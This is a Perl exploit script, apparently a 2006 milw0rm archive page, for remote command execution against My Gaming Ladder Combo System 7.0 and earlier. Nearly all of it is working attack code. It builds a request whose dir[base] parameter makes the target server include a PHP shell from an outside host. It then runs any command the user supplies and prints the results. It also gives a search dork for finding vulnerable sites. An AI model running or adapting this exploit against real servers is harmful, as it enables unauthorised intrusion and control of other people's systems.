<html><head><title>My Gaming Ladder Combo System <= 7.0 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Original advisory: http://www.nukedx.com/?viewdoc=28
#Usage: ladder.pl &lt;host&gt; &lt;path&gt; &lt;cmd&gt;
#Dork: &quot;Ladder Scripts by http://www.mygamingladder.com&quot; 40.500 pages.
use IO::Socket;
if(@ARGV &lt; 3) { usage(); }
else { exploit(); }
sub header()
{
  print &quot;\n- NukedX Security Advisory Nr.2006-28\r\n&quot;;
  print &quot;- My Gaming Ladder Combo System &lt;= 7.0 Remote Command Execution Exploit\r\n&quot;;
}
sub main::urlEncode {
  my ($string) = @_;
  $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
  #$string# =~ tr/.//;
  return $string;
}
sub usage() 
{
  header();
  print &quot;- Usage: $0 &lt;host&gt; &lt;path&gt; &lt;cmd&gt;\r\n&quot;;
  print &quot;- &lt;host&gt; -&gt; Victim's host ex: www.victim.com\r\n&quot;;
  print &quot;- &lt;path&gt; -&gt; Path to My Gaming Ladder ex: /ladder/\r\n&quot;;
  print &quot;- &lt;cmd&gt;  -&gt; Command to execute ex: ls -la\r\n&quot;;
  print &quot;- This exploit needs allow_url_fopen set to 1 and register_globals on\r\n&quot;;
  exit();
}
sub exploit () 
{
  #Our variables...
  $echoing  = &quot;&quot;;
  $ldserver = $ARGV[0];
  $ldserver =~ s/(http:\/\/)//eg;
  $ldhost   = &quot;http://&quot;.$ldserver;
  $lddir    = $ARGV[1];
  $ldport   = &quot;80&quot;;
  $ldtar    = &quot;stats.php?dir[func]=&amp;dir[base]=http://www.misssera.com.tr/old/rce.txt%3F&amp;command=&quot;;
  $ldcmd    = &quot;&quot;; for ($i=2; $i&lt;=$#ARGV; $i++) {$ldcmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};
  $ldreq    = $ldhost.$lddir.$ldtar.$ldcmd;
  #Sending data...
  header();
  print &quot;- Trying to connect: $ldserver\r\n&quot;;
  $ld = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$ldserver&quot;, PeerPort =&gt; &quot;$ldport&quot;) || die &quot;- Connection failed...\n&quot;;
  print $ld &quot;GET $ldreq HTTP/1.1\n&quot;;
  print $ld &quot;Accept: */*\n&quot;;
  print $ld &quot;Referer: $ldhost\n&quot;;
  print $ld &quot;Accept-Language: tr\n&quot;;
  print $ld &quot;User-Agent: NukeZilla\n&quot;;
  print $ld &quot;Cache-Control: no-cache\n&quot;;
  print $ld &quot;Host: $ldserver\n&quot;;
  print $ld &quot;Connection: close\n\n&quot;;
  print &quot;- Connected...\r\n&quot;;
  $echoing = &quot;No&quot;;
  while ($answer = &lt;$ld&gt;) {
    if ($answer =~ /NukedX here/) { $echoing = &quot;Yes&quot;; }
    if ($answer =~ /NukedX was here/) { print &quot;- End of results\n&quot;; exit(); }
    if ($echoing =~ /Yes/) { 
      if ($answer =~ /NukedX here/) { print &quot;- Command executed succesfully here is results\r\n&quot;; }
      else { print &quot;$answer&quot;; }
    }
  }
  #Exploit failed...
  print &quot;- Exploit failed\n&quot;
}

# milw0rm.com [2006-04-22]</pre></html>